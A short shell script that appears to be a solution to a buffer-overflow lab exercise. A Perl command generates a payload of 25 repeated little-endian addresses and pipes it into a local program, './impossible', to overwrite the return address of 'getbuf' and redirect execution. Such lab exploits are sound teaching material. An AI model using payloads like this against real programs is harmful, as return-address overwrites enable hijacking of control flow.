#!/bin/sh

# Overwrite the return address of getbuf with the address of impossible
perl -e 'print "\x14\x84\x04\x08"x25' | ./impossible
